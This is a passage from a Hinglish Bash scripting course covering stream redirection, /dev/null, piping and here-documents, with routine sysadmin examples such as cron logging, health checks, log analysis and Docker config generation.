    echo "✓ Backup successful!" | tee -a "$COMBINED_LOG"
    
    # Compress backup
    gzip "$BACKUP_DIR/${DB_NAME}_${DATE}.sql" &>> "$COMBINED_LOG"
    
    echo "Backup file: $BACKUP_DIR/${DB_NAME}_${DATE}.sql.gz"
    exit 0
fi
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Order galat:** `2>&1 > file` galat - `> file 2>&1` sahi
- ❌ **`&>` purane shells mein:** Bash 4+ mein hi kaam karta hai
- ❌ **Append confuse karna:** `&>` overwrite, `&>>` append

### 10. **Best Practices / Pro Tips**
- 💡 **Portable scripts:** `> file 2>&1` use karo, `&>` nahi
- 💡 **Debugging:** Ek file mein dono streams helpful hai
- 💡 **Production:** Alag files prefer karo (analysis easy)
- 💡 **Cron jobs:** `&>>` use karo logs append karne ke liye

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek system administrator hain aur cron job setup kar rahe hain:

```bash
#!/bin/bash
# Cron job script - complete output capture

SCRIPT_NAME="nightly_maintenance"
LOG_FILE="/var/log/${SCRIPT_NAME}_$(date +%Y%m%d).log"

# Cron job entry:
# 0 2 * * * /usr/local/bin/nightly_maintenance.sh &>> /var/log/nightly_maintenance.log

{
    echo "================================"
    echo "Script: $SCRIPT_NAME"
    echo "Started: $(date)"
    echo "================================"
    
    # System updates
    echo "Running system updates..."
    apt-get update && apt-get upgrade -y
    
    # Cleanup
    echo "Cleaning up old logs..."
    find /var/log -name "*.log" -mtime +30 -delete
    
    # Database optimization
    echo "Optimizing databases..."
    mysqlcheck --optimize --all-databases
    
    echo "================================"
    echo "Completed: $(date)"
    echo "================================"
} &>> "$LOG_FILE"

# Email summary if errors
if grep -i "error\|fail" "$LOG_FILE" > /dev/null; then
    mail -s "Maintenance Errors - $(hostname)" admin@example.com < "$LOG_FILE"
fi
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `&>` dono streams ek file mein (Bash 4+)
- ✅ `> file 2>&1` portable alternative
- ✅ `> out.txt 2> err.txt` alag files mein
- ✅ `&>>` dono append karta hai
- ✅ Order important: `> file 2>&1` sahi sequence

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `&>` aur `> file 2>&1` mein kya fark hai?**
A: Functionally same hain, lekin `> file 2>&1` zyada portable hai (purane shells mein bhi kaam karega).

**Q2: Kaunsa better hai - ek file ya do alag files?**
A: Depends on use case. Debugging ke liye ek file easy. Production analysis ke liye alag files better.

**Q3: Cron jobs mein kaunsa use karu?**
A: `&>>` best hai - dono streams append honge aur kuch miss nahi hoga.

### 14. **Practice ke liye Task**

```bash
# 1. Test files banao
touch existing.txt

# 2. Dono ek file mein (&>)
ls existing.txt /nonexistent &> combined1.txt
cat combined1.txt

# 3. Dono ek file mein (portable)
ls existing.txt /nonexistent > combined2.txt 2>&1
cat combined2.txt

# 4. Dono alag files mein
ls existing.txt /nonexistent > output.txt 2> errors.txt
cat output.txt
cat errors.txt

# 5. Append practice
echo "First run" &> log.txt
echo "Second run" &>> log.txt
cat log.txt

# 6. Cleanup
rm existing.txt combined*.txt output.txt errors.txt log.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔀 `&>` dono streams ek file mein redirect karta hai
- 📝 `> file 2>&1` portable alternative hai
- 📂 Alag files: `> out.txt 2> err.txt`
- ➕ `&>>` append ke liye
- 🎯 Use case ke hisaab se choose karo

> **💡 Ye Zaroor Yaad Rakhein:**
> Order matters! `> file 2>&1` sahi hai, `2>&1 > file` galat result dega. Portable scripts ke liye `> file 2>&1` prefer karo `&>` se!

---

## **Topic 5: The Black Hole (`/dev/null`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**The Black Hole (/dev/null)** - Unwanted output ko permanently discard karne ka tarika.

### 2. **Ye Kya Hai? (What is it?)**
`/dev/null` ek special file hai jo sab kuch "kha jaati" hai - jo bhi isme bhejo, gayab ho jata hai. Yeh output ko suppress karne ke liye use hoti hai jab aapko output chahiye hi nahi.

**Analogy:** Socho ki `/dev/null` ek black hole hai space mein. Jo bhi isme jaaye, permanently gayab - na wapas aaye, na kahin store ho. Perfect trash can jo kabhi bharta nahi!

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Noise reduction** - Unwanted output hide karna
- ✅ **Clean scripts** - Sirf important output dikhana
- ✅ **Performance** - Output processing ka overhead nahi
- ✅ **Silent operations** - Background tasks ke liye

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab output ki zaroorat nahi
- Error messages hide karne ke liye
- Silent scripts banate waqt
- Testing mein jab sirf exit status chahiye

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Terminal output se bhara rahega
- Scripts noisy rahenge
- Important output unwanted output mein kho jayega
- Professional scripts nahi bana paoge

### 6. **Syntax aur Common Options**

```bash
# Stdout discard
command > /dev/null

# Stderr discard
command 2> /dev/null

# Dono discard
command &> /dev/null
command > /dev/null 2>&1

# Input from /dev/null (empty input)
command < /dev/null

# Check file existence silently
[ -f file.txt ] 2>/dev/null
```

**Common Patterns:**
- `> /dev/null` - Output hide karo
- `2> /dev/null` - Errors hide karo
- `&> /dev/null` - Sab kuch hide karo
- `< /dev/null` - Empty input do

### 7. **Example 1 (Basic)**

```bash
# Normal output
$ ls file.txt
file.txt

# Output hidden
$ ls file.txt > /dev/null
(no output)

# Error visible
$ ls /nonexistent
ls: cannot access '/nonexistent': No such file or directory

# Error hidden
$ ls /nonexistent 2> /dev/null
(no output)

# Everything hidden
$ ls file.txt /nonexistent &> /dev/null
(no output)
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Silent system checker

check_service() {
    local service=$1
    
    # Check silently - sirf exit status chahiye
    if systemctl is-active "$service" &> /dev/null; then
        echo "✓ $service is running"
        return 0
    else
        echo "✗ $service is not running"
        return 1
    fi
}

check_port() {
    local port=$1
    
    # Port check silently
    if nc -z localhost "$port" &> /dev/null; then
        echo "✓ Port $port is open"
        return 0
    else
        echo "✗ Port $port is closed"
        return 1
    fi
}

check_disk_space() {
    local threshold=90
    
    # Get usage percentage (errors hidden)
    usage=$(df -h / | awk 'NR==2 {print $5}' | sed 's/%//')
    
    if [ "$usage" -gt "$threshold" ] 2>/dev/null; then
        echo "⚠️  Disk usage: ${usage}% (threshold: ${threshold}%)"
        return 1
    else
        echo "✓ Disk usage: ${usage}%"
        return 0
    fi
}

echo "=== System Health Check ==="
check_service "apache2"
check_service "mysql"
check_port 80
check_port 3306
check_disk_space
```

**Output:**
```
=== System Health Check ===
✓ apache2 is running
✗ mysql is not running
✓ Port 80 is open
✓ Port 3306 is open
✓ Disk usage: 45%
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Important output discard karna:** Debugging mushkil ho jayegi
- ❌ **Errors blindly hide karna:** Problems detect nahi honge
- ❌ **`/dev/null` ko file samajhna:** Yeh special device hai, normal file nahi

### 10. **Best Practices / Pro Tips**
- 💡 **Selective use:** Sirf unwanted output hide karo
- 💡 **Development vs Production:** Development mein output dekho, production mein hide karo
- 💡 **Exit status check:** Output hide karne ke baad `$?` check karo
- 💡 **Verbose flags:** Scripts mein `-v` flag do output control ke liye

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek monitoring script bana rahe hain jo har minute chale aur sirf problems report kare:

```bash
#!/bin/bash
# Silent monitoring - sirf problems report karo

ALERT_EMAIL="admin@example.com"
ALERT_FILE="/tmp/alerts.txt"

> "$ALERT_FILE"  # Clear alerts

# Check services silently
for service in apache2 mysql redis; do
    if ! systemctl is-active "$service" &> /dev/null; then
        echo "⚠️ Service down: $service" >> "$ALERT_FILE"
    fi
done

# Check disk space silently
df -h | awk 'NR>1 {gsub(/%/,"",$5); if($5>90) print "⚠️ Disk full: "$6" ("$5"%)"}' >> "$ALERT_FILE"

# Check memory silently
mem_usage=$(free | awk 'NR==2 {printf "%.0f", $3/$2*100}')
if [ "$mem_usage" -gt 90 ] 2>/dev/null; then
    echo "⚠️ Memory high: ${mem_usage}%" >> "$ALERT_FILE"
fi

# Send alert only if problems found
if [ -s "$ALERT_FILE" ]; then
    mail -s "System Alerts - $(hostname)" "$ALERT_EMAIL" < "$ALERT_FILE"
fi

# Cron entry (runs every minute, completely silent):
# * * * * * /usr/local/bin/monitor.sh &> /dev/null
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `/dev/null` sab kuch discard kar deta hai
- ✅ `> /dev/null` output hide, `2> /dev/null` errors hide
- ✅ `&> /dev/null` sab kuch hide
- ✅ Silent operations ke liye perfect
- ✅ Exit status check karna mat bhoolna

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `/dev/null` mein bheja data kahan jaata hai?**
A: Kahin nahi! Permanently discard ho jaata hai. Yeh ek special device file hai jo sab kuch "kha jaati" hai.

**Q2: Kya `/dev/null` se read kar sakte hain?**
A: Haan, lekin hamesha empty milega. `< /dev/null` empty input deta hai.

**Q3: Kya `/dev/null` full ho sakta hai?**
A: Nahi! Yeh kabhi full nahi hota. Unlimited data discard kar sakta hai.

### 14. **Practice ke liye Task**

```bash
# 1. Normal output
echo "Hello World"

# 2. Output hidden
echo "Hello World" > /dev/null

# 3. Error visible
ls /nonexistent

# 4. Error hidden
ls /nonexistent 2> /dev/null

# 5. Everything hidden
ls file.txt /nonexistent &> /dev/null

# 6. Silent check with exit status
if ls /nonexistent &> /dev/null; then
    echo "File exists"
else
    echo "File does not exist"
fi

# 7. Command exists check
if command -v docker &> /dev/null; then
    echo "Docker is installed"
else
    echo "Docker is not installed"
fi
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🕳️ `/dev/null` permanent trash can hai
- 🔇 Unwanted output ko silently discard karta hai
- 🎯 `> /dev/null` output, `2> /dev/null` errors
- ✅ Exit status check karna mat bhoolna
- 🔧 Silent operations aur clean scripts ke liye essential

> **💡 Ye Zaroor Yaad Rakhein:**
> `/dev/null` powerful tool hai lekin carefully use karo! Important errors hide mat karo. Development mein output dekho, production mein selectively hide karo!

---

## **Topic 6: Piping (`|`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Piping** - Ek command ka output doosre command ko input ke roop mein dena.

### 2. **Ye Kya Hai? (What is it?)**
Pipe (`|`) operator ek command ke stdout ko doosre command ke stdin se connect kar deta hai. Yeh commands ko chain karne ka tarika hai jahan ek ka output dusre ka input ban jaata hai.

**Analogy:** Socho ki ek assembly line hai factory mein. Pehla worker kuch banata hai aur directly next worker ko de deta hai, woh process karta hai aur agle ko deta hai. Pipe (`|`) yeh connection hai workers ke beech.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Command chaining** - Complex operations ko simple commands se banana
- ✅ **Data processing** - Step-by-step data transform karna
- ✅ **Efficiency** - Intermediate files ki zaroorat nahi
- ✅ **Unix philosophy** - "Do one thing well" commands ko combine karna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Data filtering aur processing
- Log analysis
- Text manipulation
- Complex queries banate waqt

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Har step ke liye temporary files banani padegi
- Code complex aur slow hoga
- Linux ka real power use nahi kar paoge
- Professional scripting impossible

### 6. **Syntax aur Common Options**

```bash
# Basic pipe
command1 | command2

# Multiple pipes
command1 | command2 | command3

# Common patterns
cat file | grep pattern
ls -l | wc -l
ps aux | grep process
history | tail -20

# With redirection
command1 | command2 > output.txt
command1 | command2 | command3 > final.txt
```

**Common Pipe Combinations:**
- `| grep` - Filter lines
- `| sort` - Sort output
- `| uniq` - Remove duplicates
- `| wc` - Count lines/words
- `| head/tail` - First/last lines
- `| awk/sed` - Text processing

### 7. **Example 1 (Basic)**

```bash
# Line count
$ ls | wc -l
15

# Filter processes
$ ps aux | grep apache
user  1234  0.0  0.1  apache2

# Sort by size
$ ls -lh | sort -k5 -h
-rw-r--r-- 1 user user  1.2K file1.txt
-rw-r--r-- 1 user user  5.4M file2.txt

# Last 10 commands
$ history | tail -10

# Unique sorted list
$ cat names.txt | sort | uniq
Alice
Bob
Charlie
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Log analyzer - top IP addresses

LOG_FILE="/var/log/apache2/access.log"

echo "=== Top 10 IP Addresses ==="
cat "$LOG_FILE" | \
    awk '{print $1}' | \
    sort | \
    uniq -c | \
    sort -rn | \
    head -10 | \
    awk '{printf "%-15s : %s requests\n", $2, $1}'

echo -e "\n=== Top 10 Requested URLs ==="
cat "$LOG_FILE" | \
    awk '{print $7}' | \
    sort | \
    uniq -c | \
    sort -rn | \
    head -10 | \
    awk '{printf "%-50s : %s requests\n", $2, $1}'

echo -e "\n=== HTTP Status Codes ==="
cat "$LOG_FILE" | \
    awk '{print $9}' | \
    sort | \
    uniq -c | \
    sort -rn | \
    awk '{printf "Status %s : %s occurrences\n", $2, $1}'

echo -e "\n=== Failed Login Attempts ==="
cat "$LOG_FILE" | \
    grep "Failed password" | \
    awk '{print $11}' | \
    sort | \
    uniq -c | \
    sort -rn | \
    head -5 | \
    awk '{printf "%-15s : %s attempts\n", $2, $1}'
```

**Output:**
```
=== Top 10 IP Addresses ===
192.168.1.100   : 1523 requests
10.0.0.50       : 892 requests
172.16.0.25     : 654 requests
...

=== Top 10 Requested URLs ===
/index.html                                        : 2341 requests
/api/users                                         : 1876 requests
...

=== HTTP Status Codes ===
Status 200 : 15234 occurrences
Status 404 : 892 occurrences
Status 500 : 45 occurrences
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Useless use of cat:** `cat file | grep pattern` ki jagah `grep pattern file` better
- ❌ **Pipe aur redirect confuse:** `|` commands connect karta hai, `>` files mein save karta hai
- ❌ **Stderr pipe nahi hota:** By default sirf stdout pipe hota hai

### 10. **Best Practices / Pro Tips**
- 💡 **UUOC avoid karo:** "Useless Use Of Cat" - direct command use karo
- 💡 **Stderr bhi pipe karo:** `command 2>&1 | next_command`
- 💡 **`tee` use karo:** Output dekho aur save bhi karo
- 💡 **Pipe chains readable rakho:** Long chains ko multiple lines mein likho

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek security analyst hain aur SSH brute force attacks detect karni hain:

```bash
#!/bin/bash
# SSH brute force detector

AUTH_LOG="/var/log/auth.log"
THRESHOLD=5
ALERT_EMAIL="security@example.com"

echo "=== SSH Brute Force Detection ==="
echo "Threshold: $THRESHOLD failed attempts"
echo ""

# Find IPs with failed attempts above threshold
cat "$AUTH_LOG" | \
    grep "Failed password" | \
    grep -oP 'from \K[0-9.]+' | \
    sort | \
    uniq -c | \
    awk -v threshold="$THRESHOLD" '$1 > threshold {print $1, $2}' | \
    sort -rn | \
    while read count ip; do
        echo "⚠️  IP: $ip - $count failed attempts"
        
        # Check if already blocked
        if ! iptables -L -n | grep -q "$ip"; then
            echo "   Blocking $ip..."
            iptables -A INPUT -s "$ip" -j DROP
            echo "   ✓ Blocked"
        else
            echo "   Already blocked"
        fi
    done | tee /tmp/brute_force_report.txt

# Send email if attacks found
if [ -s /tmp/brute_force_report.txt ]; then
    mail -s "SSH Brute Force Detected - $(hostname)" "$ALERT_EMAIL" < /tmp/brute_force_report.txt
fi
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `|` ek command ka output doosre ko input deta hai
- ✅ Multiple pipes chain kar sakte hain
- ✅ Sirf stdout pipe hota hai (stderr nahi)
- ✅ Intermediate files ki zaroorat nahi
- ✅ Unix philosophy ka core concept

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Pipe aur redirection mein kya fark hai?**
A: Pipe (`|`) commands connect karta hai. Redirection (`>`) output ko files mein save karta hai.

**Q2: Kya stderr bhi pipe ho sakta hai?**
A: By default nahi. `2>&1 |` use karo stderr ko bhi pipe karne ke liye.

**Q3: Kitne pipes use kar sakte hain?**
A: Technically unlimited, lekin readability ke liye 3-4 se zyada avoid karo.

### 14. **Practice ke liye Task**

```bash
# 1. Line count
ls | wc -l

# 2. Filter and count
ps aux | grep bash | wc -l

# 3. Sort and unique
echo -e "apple\nbanana\napple\ncherry" | sort | uniq

# 4. Top 5 largest files
ls -lh | sort -k5 -hr | head -5

# 5. Word frequency
cat /etc/passwd | cut -d: -f7 | sort | uniq -c | sort -rn

# 6. Process tree filtered
ps aux | grep -v grep | grep apache

# 7. Complex chain
history | awk '{print $2}' | sort | uniq -c | sort -rn | head -10
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔗 Pipe commands ko connect karta hai
- 📊 Data processing ka powerful tool
- ⚡ Efficient - no intermediate files
- 🎯 Unix philosophy ka implementation
- 🔧 Professional scripting ka backbone

> **💡 Ye Zaroor Yaad Rakhein:**
> Piping Linux ki superpower hai! Commands ko chain karke complex operations simple ban jaate hain. "Useless Use of Cat" se bacho aur pipes ka sahi use karo!

---

## **Topic 7: Input Redirection (`cat > file`, Here Docs `<<EOF`, Here Strings `<<<`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Input Redirection** - Commands ko input dene ke advanced tareeke.

### 2. **Ye Kya Hai? (What is it?)**
Input redirection commands ko data dene ke different ways hain: files se (`<`), multi-line text se (Here Documents `<<`), ya single string se (Here Strings `<<<`). Yeh interactive input ya file input ki jagah use hote hain.

**Analogy:** Socho ki ek machine hai jo raw material chahiye. Normal tarike se aap ek-ek piece dete hain (keyboard input). Input redirection se aap ek truck bhara material de sakte hain (file), ya ek pre-packed box (Here Doc), ya ek single item (Here String).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Automation** - Manual input ki zaroorat nahi
- ✅ **Multi-line input** - Scripts mein complex data dena
- ✅ **Configuration** - Config blocks scripts mein embed karna
- ✅ **Testing** - Automated testing ke liye input provide karna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Scripts mein multi-line text chahiye
- SQL queries, config files embed karne ke liye
- Interactive commands ko automate karna
- Testing aur automation mein

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Manual input dena padega (automation impossible)
- Multi-line text handle karna mushkil
- Scripts interactive rahenge (non-automated)
- Professional automation nahi kar paoge

### 6. **Syntax aur Common Options**

```bash
# File se input
command < input.txt

# Here Document (multi-line)
command << EOF
line 1
line 2
line 3
EOF

# Here Document (variables expand)
cat << EOF
Hello $USER
Today is $(date)
EOF

# Here Document (literal - no expansion)
cat << 'EOF'
Hello $USER
Today is $(date)
EOF

# Here String (single line)
command <<< "single line input"

# Interactive file creation
cat > file.txt << EOF
content here
EOF
```

**Important Concepts:**
- `<` - File se input
- `<<` - Here Document (multi-line)
- `<<<` - Here String (single line)
- `<< 'EOF'` - Literal (no variable expansion)
- `<< EOF` - Variables expand hote hain

### 7. **Example 1 (Basic)**

```bash
# File se input
$ cat < input.txt
(file ka content)

# Here Document
$ cat << EOF
> Hello World
> This is line 2
> This is line 3
> EOF
Hello World
This is line 2
This is line 3

# Here String
$ wc -w <<< "Hello World from Bash"
4

# Variable expansion
$ name="Satish"
$ cat << EOF
> Hello $name
> Welcome to Bash
> EOF
Hello Satish
Welcome to Bash
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Multi-purpose script using all input redirection types

# 1. Create config file using Here Document
create_config() {
    local app_name=$1
    local port=$2
    
    cat > "/etc/${app_name}.conf" << EOF
# Configuration for $app_name
# Generated on $(date)

[server]
host = 0.0.0.0
port = $port
debug = false

[database]
host = localhost
port = 3306
name = ${app_name}_db

[logging]
level = INFO
file = /var/log/${app_name}.log
EOF
    
    echo "✓ Config created: /etc/${app_name}.conf"
}

# 2. SQL query using Here Document
run_database_setup() {
    local db_name=$1
    
    mysql -u root -p"$DB_PASS" << EOF
CREATE DATABASE IF NOT EXISTS $db_name;
USE $db_name;

CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    email VARCHAR(100) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS logs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    action VARCHAR(100),
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

GRANT ALL PRIVILEGES ON $db_name.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;
EOF
    
    echo "✓ Database setup complete: $db_name"
}

# 3. Email using Here Document
send_report() {
    local recipient=$1
    local subject=$2
    
    mail -s "$subject" "$recipient" << EOF
Dear Admin,

This is an automated report from $(hostname).

System Status:
- Uptime: $(uptime -p)
- Disk Usage: $(df -h / | awk 'NR==2 {print $5}')
- Memory Usage: $(free -h | awk 'NR==2 {print $3 "/" $2}')

Generated at: $(date)

Best regards,
Automated Monitoring System
EOF
    
    echo "✓ Email sent to: $recipient"
}

# 4. Here String for quick processing
validate_email() {
    local email=$1
    
    if grep -qE '^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$' <<< "$email"; then
        echo "✓ Valid email: $email"
        return 0
    else
        echo "✗ Invalid email: $email"
        return 1
    fi
}

# 5. Interactive menu using Here Document
show_menu() {
    cat << 'EOF'
================================
    SYSTEM MANAGEMENT MENU
================================
1. Create Configuration
2. Setup Database
3. Send Report
4. Validate Email
5. Exit
================================
EOF
}

# Main execution
echo "=== Multi-Input Redirection Demo ==="

# Create config
create_config "myapp" 8080

# Validate email using Here String
validate_email "admin@example.com"
validate_email "invalid-email"

# Show menu
show_menu
```

**Output:**
```
=== Multi-Input Redirection Demo ===
✓ Config created: /etc/myapp.conf
✓ Valid email: admin@example.com
✗ Invalid email: invalid-email
================================
    SYSTEM MANAGEMENT MENU
================================
1. Create Configuration
2. Setup Database
3. Send Report
4. Validate Email
5. Exit
================================
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **EOF quotes bhoolna:** `<< 'EOF'` literal ke liye, `<< EOF` expansion ke liye
- ❌ **Indentation:** Here Doc mein leading spaces problem create kar sakte hain
- ❌ **EOF mismatch:** Opening aur closing EOF exactly same hone chahiye

### 10. **Best Practices / Pro Tips**
- 💡 **`<<-` use karo:** Leading tabs ignore karta hai (indentation ke liye)
- 💡 **Quotes use karo:** `<< 'EOF'` literal text ke liye
- 💡 **Descriptive delimiters:** `EOF`, `SQL`, `CONFIG` jaise meaningful names
- 💡 **Here Strings for single line:** `<<<` simple aur clean hai

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek DevOps engineer hain aur Docker container setup script bana rahe hain:

```bash
#!/bin/bash
# Docker container setup with embedded configs

APP_NAME="webapp"
APP_PORT=8080
DB_NAME="${APP_NAME}_db"

# 1. Create Dockerfile using Here Document
cat > Dockerfile << 'EOF'
FROM node:16-alpine

WORKDIR /app

COPY package*.json ./
RUN npm install

COPY . .

EXPOSE 8080

CMD ["npm", "start"]
EOF

echo "✓ Dockerfile created"

# 2. Create docker-compose.yml with variables
cat > docker-compose.yml << EOF
version: '3.8'

services:
  app:
    build: .
    ports:
      - "${APP_PORT}:8080"
    environment:
      - NODE_ENV=production
      - DB_HOST=db
      - DB_NAME=${DB_NAME}
    depends_on:
      - db
    restart: unless-stopped

  db:
    image: mysql:8.0
    environment:
      - MYSQL_DATABASE=${DB_NAME}
      - MYSQL_ROOT_PASSWORD=\${DB_ROOT_PASSWORD}
    volumes:
      - db_data:/var/lib/mysql
    restart: unless-stopped

volumes:
  db_data:
EOF

echo "✓ docker-compose.yml created"

# 3. Create .env file
cat > .env << EOF
APP_NAME=${APP_NAME}
APP_PORT=${APP_PORT}
DB_NAME=${DB_NAME}
DB_ROOT_PASSWORD=change_me_in_production
EOF

echo "✓ .env file created"

# 4. Initialize database using Here Document
echo "Initializing database..."
docker-compose exec -T db mysql -u root -p"\$DB_ROOT_PASSWORD" << EOF
CREATE DATABASE IF NOT EXISTS ${DB_NAME};
USE ${DB_NAME};

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) UNIQUE NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

INSERT INTO users (username, email) VALUES
    ('admin', 'admin@example.com'),
    ('user1', 'user1@example.com');

SELECT * FROM users;
EOF

echo "✓ Database initialized"

# 5. Create README using Here Document
cat > README.md << 'EOF'
# WebApp Docker Setup

## Quick Start

```bash
# Build and start containers
docker-compose up -d

# Check logs
docker-compose logs -f

# Stop containers
docker-compose down
```

## Configuration

Edit `.env` file for custom configuration.

## Database

MySQL database is automatically initialized with sample data.
EOF

echo "✓ README.md created"

echo ""
echo "=== Setup Complete ==="
echo "Run: docker-compose up -d"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `<` file se input lena
- ✅ `<< EOF` multi-line input (Here Document)
- ✅ `<<<` single line input (Here String)
- ✅ `<< 'EOF'` literal text (no expansion)
- ✅ `<<-` leading tabs ignore karta hai

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Here Document mein variables expand hote hain?**
A: Haan, by default. Literal text ke liye `<< 'EOF'` use karo (quotes ke saath).

**Q2: EOF kuch special hai?**
A: Nahi, koi bhi word use kar sakte hain. `EOF`, `END`, `SQL`, `CONFIG` - jo meaningful lage.

**Q3: Here String aur echo mein kya fark hai?**
A: `echo "text" | command` aur `command <<< "text"` similar hain, lekin Here String cleaner aur efficient hai.

### 14. **Practice ke liye Task**

```bash
# 1. Simple Here Document
cat << EOF
Hello World
This is line 2
EOF

# 2. With variables
name="Satish"
cat << EOF
Hello $name
Welcome to Bash
EOF

# 3. Literal (no expansion)
cat << 'EOF'
Hello $name
This will not expand
EOF

# 4. Create file
cat > test.txt << EOF
Line 1
Line 2
Line 3
EOF
cat test.txt

# 5. Here String
wc -w <<< "Count these words"

# 6. Here String with grep
grep "hello" <<< "hello world"

# 7. Multi-line SQL simulation
cat << EOF
SELECT * FROM users
WHERE status = 'active'
ORDER BY created_at DESC;
EOF

# 8. Cleanup
rm test.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📥 Input redirection automation ka key hai
- 📄 Here Documents multi-line text ke liye perfect
- 🔤 Here Strings single line input ke liye clean solution
- 🔧 Config files aur SQL queries embed karne ke liye ideal
- 💡 Quotes control karte hain variable expansion

> **💡 Ye Zaroor Yaad Rakhein:**
> Here Documents (`<< EOF`) professional scripts ka hallmark hain! Config files, SQL queries, aur multi-line text ke liye perfect. Quotes (`<< 'EOF'`) use karo literal text ke liye!

---

# **🎉 Module 4 Complete! 🎉**

Congratulations! Aapne **Module 4: I/O Redirection & Piping** successfully complete kar liya hai!

## **Aapne Kya Seekha:**
✅ **Output Streams** - stdin (0), stdout (1), stderr (2) ka concept
✅ **Output Redirection** - `>` (overwrite) aur `>>` (append)
✅ **Error Redirection** - `2>` se errors ko alag handle karna
✅ **Both Streams** - `&>` aur `> file 2>&1` se dono redirect karna
✅ **The Black Hole** - `/dev/null` se unwanted output discard karna
✅ **Piping** - `|` se commands ko chain karna
✅ **Input Redirection** - `<`, `<<`, `<<<` se input dena

## **Key Concepts:**
- **Streams:** 0=stdin, 1=stdout, 2=stderr
- **Redirection:** `>` overwrite, `>>` append
- **Error Handling:** `2>` errors ko alag log karo
- **Piping:** Commands ko connect karke powerful operations
- **Here Documents:** Multi-line input ka professional tarika

## **Real-World Applications:**
- **Logging:** Separate logs for output and errors
- **Monitoring:** Silent scripts with `/dev/null`
- **Data Processing:** Pipe chains for log analysis
- **Automation:** Here Documents for configs and SQL
- **Error Handling:** Professional error tracking

## **Professional Patterns:**

```bash
# Complete logging
command > output.log 2> error.log

# Silent operation with error check
if command &> /dev/null; then
    echo "Success"
fi

# Data processing pipeline
cat log.txt | grep "ERROR" | sort | uniq -c | sort -rn

# Config generation
cat > config.conf << EOF
setting1 = value1
setting2 = value2
EOF
```

## **Next Steps:**
Ab aap ready hain **Module 5: Variables & User Input** ke liye - scripting ka core!

---

**📝 Practice Reminder:**
I/O Redirection aur Piping Linux ka superpower hai! Har din practice karo:
- Log files analyze karo pipes se
- Scripts mein proper error handling add karo
- Here Documents use karke configs banao
- `/dev/null` ka sahi use seekho

**⚠️ Important Tips:**
1. **Hamesha errors log karo:** `2>` use karna mat bhoolna
2. **Order matters:** `> file 2>&1` sahi, `2>&1 > file` galat
3. **UUOC avoid karo:** "Useless Use of Cat" - direct commands prefer karo
4. **Test karo:** Production mein jaane se pehle thoroughly test karo

---

**🎯 Challenge:**
Ek complete monitoring script banao jo:
1. System stats collect kare
2. Errors ko alag log kare
3. Data ko pipes se process kare
4. Report Here Document se generate kare
5. Silent mode mein chale (`/dev/null`)

Yeh challenge Module 4 ke saare concepts use karega!

---

**💡 Pro Tip:**
I/O Redirection master karna = Professional Linux user banna! Yeh concepts har advanced script mein use hote hain. Practice karo jab tak muscle memory na ban jaye!

---
=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 5)**

---

## **PART 2: THE CORE OF SCRIPTING**

---

# **Module 5: Variables & User Input**

---

## **Topic 1: Creating & Accessing Variables (`var=value`, `$var`, `${var}`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Variables** - Data ko store karna aur use karna scripts mein.

### 2. **Ye Kya Hai? (What is it?)**
Variables containers hain jo data store karte hain - numbers, text, paths, etc. Bash mein variable banana simple hai: `name=value` (no spaces!). Access karne ke liye `$name` ya `${name}` use karo.

**Analogy:** Socho ki variable ek labeled box hai. Box par naam likha hai (variable name), aur andar kuch rakha hai (value). Jab chahiye, box ka naam bolo aur andar ka saman mil jayega.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
